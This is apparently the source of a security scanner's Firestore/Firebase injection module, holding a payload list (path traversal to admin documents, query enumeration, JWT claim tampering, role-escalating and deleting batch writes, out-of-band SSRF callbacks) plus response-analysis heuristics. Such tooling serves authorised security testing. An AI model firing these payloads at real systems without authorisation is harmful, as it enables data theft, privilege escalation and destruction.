import re
from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport


class FirestoreInjector(BaseInjector):
    """Google Firestore / Firebase injection testing module."""

    name = "firestore"
    description = "Tests for Google Firestore / Firebase injection vulnerabilities"

    # Firestore / Firebase / gRPC error patterns
    ERROR_PATTERNS = [
        r"FirebaseError",
        r"FirestoreError",
        r"PERMISSION_DENIED",
        r"NOT_FOUND",
        r"INVALID_ARGUMENT",
        r"ALREADY_EXISTS",
        r"FAILED_PRECONDITION",
        r"@firebase",
        r"firestore",
        r"google\.cloud",
        r"googleapis\.com",
        r"grpc",
        r"StatusCode",
        r"rules_error",
        r"Missing or insufficient permissions",
        r"deadline exceeded",
        r"unavailable",
        r"firebase-admin",
        r"firebase\.google\.com",
        r"cloud\.google\.com/firestore",
        r"firebaseio\.com",
    ]

    # Patterns indicating Firebase Auth / JWT issues
    AUTH_PATTERNS = [
        r"auth/id-token-expired",
        r"auth/argument-error",
        r"auth/invalid-custom-token",
        r"auth/invalid-credential",
        r"Firebase ID token has expired",
        r"Decoding Firebase ID token failed",
        r"auth/user-not-found",
    ]

    def generate_quick_payloads(self, context: dict) -> list[str]:
        return [
            '{"__name__": {"$exists": true}}',
            '..%2F..%2Fusers%2Fadmin',
            '{"structuredQuery": {"where": {"fieldFilter": {"field": {"fieldPath": "__name__"}, "op": "EQUAL", "value": {"stringValue": "*"}}}}}',
            '{"__name__": "projects/*/databases/*/documents/*"}',
        ]

    def generate_payloads(self, context: dict) -> list[str]:
        oob = self._get_oob_url()
        return [
            # ── Security Rules bypass — document path manipulation ──
            '..%2F..%2Fusers%2Fadmin',
            '../../../users/admin',
            'users%2F__admin__',
            '..%2F..%2F.auth%2Fconfig',
            'projects/default/databases/(default)/documents/users/admin',
            '_metadata/collections',

            # ── Firestore internal field probes ──
            '{"__name__": {"$exists": true}}',
            '{"__name__": "projects/*/databases/*/documents/*"}',
            '{"__key__": {"$gt": ""}}',
            '{"__type__": "document"}',
            '{"__name__": {"$regex": ".*"}}',

            # ── Query injection — .where() operator manipulation ──
            '{"fieldPath": "__name__", "op": "EQUAL", "value": "*"}',
            '{"fieldPath": "__name__", "op": ">=", "value": ""}',
            '{"compositeFilter": {"op": "AND", "filters": [{"fieldFilter": {"field": {"fieldPath": "__name__"}, "op": ">=", "value": {"stringValue": ""}}}]}}',

            # ── Structured query injection (REST API) ──
            '{"structuredQuery": {"where": {"fieldFilter": {"field": {"fieldPath": "__name__"}, "op": "EQUAL", "value": {"stringValue": "*"}}}}}',
            '{"structuredQuery": {"from": [{"collectionId": "users", "allDescendants": true}]}}',
            '{"structuredQuery": {"orderBy": [{"field": {"fieldPath": "__name__"}, "direction": "ASCENDING"}], "limit": 1000}}',
            '{"structuredQuery": {"select": {"fields": [{"fieldPath": "__name__"}]}, "from": [{"collectionId": "users"}]}}',

            # ── Firebase Auth bypass — JWT claim tampering ──
            '{"uid": "admin", "admin": true}',
            '{"claims": {"admin": true}}',
            '{"email": "admin@firebase.internal", "email_verified": true}',
            '{"iss": "https://securetoken.google.com/TARGET_PROJECT"}',

            # ── Collection group queries (cross-collection access) ──
            '{"collectionId": "users", "allDescendants": true}',
            '{"parent": "projects/default/databases/(default)/documents"}',

            # ── orderBy manipulation ──
            '__name__',
            '__name__ desc',
            'fieldPath=__name__&direction=DESCENDING',

            # ── GQL / Datastore mode payloads ──
            'SELECT * FROM users WHERE __key__ HAS ANCESTOR KEY(User, "admin")',
            'SELECT * FROM users LIMIT 1000',
            'SELECT __key__ FROM users',

            # ── Error probing — trigger Firestore-specific errors ──
            '{"field": {"fieldPath": ""}, "op": "INVALID_OP", "value": null}',
            '{"writes": [{"delete": "projects/x/databases/x/documents/users/admin"}]}',
            '{"transaction": "INVALID_TRANSACTION_ID"}',
            '{"readTime": "1970-01-01T00:00:00Z"}',

            # ── Batch / transaction abuse ──
            '{"writes": [{"update": {"name": "projects/x/databases/(default)/documents/users/admin", "fields": {"role": {"stringValue": "admin"}}}}]}',
            '{"newTransaction": {"readWrite": {}}}',

            # ── Field mask injection ──
            'updateMask.fieldPaths=role&fields.role.stringValue=admin',
            '{"updateMask": {"fieldPaths": ["*"]}}',

            # ── OOB payloads — SSRF via field values ──
            f'{{"webhook": "{oob}/firestore/ssrf1"}}',
            f'{{"callback_url": "{oob}/firestore/ssrf2"}}',
            f'{{"imageUrl": "{oob}/firestore/ssrf3"}}',

            # ── OOB — Cloud Function trigger paths ──
            f'{{"functionUrl": "{oob}/firestore/func1"}}',
            f'{{"endpoint": "{oob}/firestore/func2"}}',
        ]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str,
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        body = test_response.get("body", "")
        body_lower = body.lower()
        baseline_body = baseline.get("body", "")
        baseline_lower = baseline_body.lower()
        test_status = test_response.get("status_code", 0)
        baseline_status = baseline.get("status_code", 0)
        test_time = test_response.get("response_time_ms", 0)
        baseline_time = baseline.get("response_time_ms", 0)

        # 1. Firestore / Firebase / gRPC error patterns leaked
        for pattern in self.ERROR_PATTERNS:
            if re.search(pattern, body_lower, re.IGNORECASE):
                if not re.search(pattern, baseline_lower, re.IGNORECASE):
                    evidence.append(f"Firestore error pattern: {pattern}")
                    is_vulnerable = True
                    confidence = "high"

        # 2. Firebase Auth error patterns
        for pattern in self.AUTH_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                if not re.search(pattern, baseline_body, re.IGNORECASE):
                    evidence.append(f"Firebase Auth error leaked: {pattern}")
                    is_vulnerable = True
                    confidence = "high"

        # 3. Time-based detection (deadline exceeded, slow queries)
        if test_time > baseline_time + 2500:
            if "deadline" in payload.lower() or "readTime" in payload:
                evidence.append(
                    f"Time-based: {test_time:.0f}ms vs baseline {baseline_time:.0f}ms"
                )
                is_vulnerable = True
                confidence = "high"

        # 4. Auth bypass detection — status changed from 403/401 → 200
        if baseline_status in (401, 403) and test_status == 200:
            evidence.append(
                f"Auth bypass: status changed from {baseline_status} to {test_status}"
            )
            is_vulnerable = True
            confidence = "high"

        # 5. Data enumeration — more data returned than baseline
        body_stripped = body.strip().strip('"')
        is_empty = (
            not body_stripped
            or body_stripped in ("null", "{}", "[]")
        )
        is_rejection = 400 <= test_status < 500

        if is_rejection and not is_vulnerable:
            return VulnerabilityReport(
                is_vulnerable=False,
                confidence="low",
                details="Server rejected input (validation — not a vuln)",
                evidence=evidence,
            )

        if not is_empty and test_status == 200:
            if len(body) > len(baseline_body) + 50:
                evidence.append("Response larger than baseline — possible data enumeration")
                if not is_vulnerable:
                    is_vulnerable = True
                    confidence = "medium"

        # 6. Server error triggered
        if test_status == 500 and baseline_status != 500:
            evidence.append(f"500 error triggered (baseline was {baseline_status})")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "medium"

        # 7. Structured query payloads returned data
        if "structuredQuery" in payload and test_status == 200 and not is_empty:
            if body != baseline_body:
                evidence.append("Structured query payload returned data")
                if not is_vulnerable:
                    is_vulnerable = True
                    confidence = "medium"

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else "No indicators found",
            evidence=evidence,
        )
